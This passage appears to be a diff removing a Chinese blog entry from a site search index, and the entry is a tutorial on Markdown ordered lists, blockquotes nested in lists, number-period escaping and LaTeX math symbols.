-<p><strong>有序列表的表示</strong></p>
-<p>直接用一个数字和英文句点就行</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1. balabala</span><br><span class="line">2. balabala</span><br><span class="line">3. balabala</span><br></pre></td></tr></table></figure>
-<p>显示效果：</p>
-<ol>
-<li>有序列表一</li>
-<li>有序列表二</li>
-<li>有序列表三</li>
-</ol>
-<h5 id="包含引用（虽然我感觉没啥用2333）">包含引用（虽然我感觉没啥用2333）</h5>
-<p>语法：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">* 阅读的方法</span><br><span class="line">	&gt; 打开电灯</span><br><span class="line">	&gt; 打开书本</span><br></pre></td></tr></table></figure>
-<p>效果：</p>
-<ul>
-<li>
-<p>阅读的方法</p>
-<blockquote>
-<p>打开电灯<br>
-打开书本</p>
-</blockquote>
-</li>
-</ul>
-<h5 id="特殊情况">特殊情况</h5>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.1986\. what a  great season.(正确)</span><br><span class="line">2.1986. what a  great season.(错误)</span><br></pre></td></tr></table></figure>
-<p>emmm,自己注意一下</p>
-<ol>
-<li>1986. what a  great season.</li>
-</ol>
-<h1>公式</h1>
-<p>语法：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">质能守恒方程可以用$E=mc^2$来表达</span><br></pre></td></tr></table></figure>
-<p>效果：$E=mc^2$</p>
-<p>数学符号</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">尖括号:\langle</span><br><span class="line">上取整:\lceil</span><br><span class="line">下取整:\lfloor</span><br><span class="line">分数:\frac&#123;分子&#125;&#123;分母&#125;</span><br><span class="line">求和:\sum</span><br><span class="line">积分:\int_&#123;下限&#125;^&#123;\infty&#125;后面的括号表示上限，\infty表示无限</span><br><span class="line">极限:\lim_&#123;x\to+\infty&#125;</span><br></pre></td></tr></table></figure>
-<p>极限的效果：$\lim_{x\to +\infty}$</p>
-]]></content>
-      <categories>
-        <category>博客</category>
-      </categories>
-      <tags>
-        <tag>语法</tag>
-        <tag>markdown</tag>
       </tags>
   </entry>
 </search>
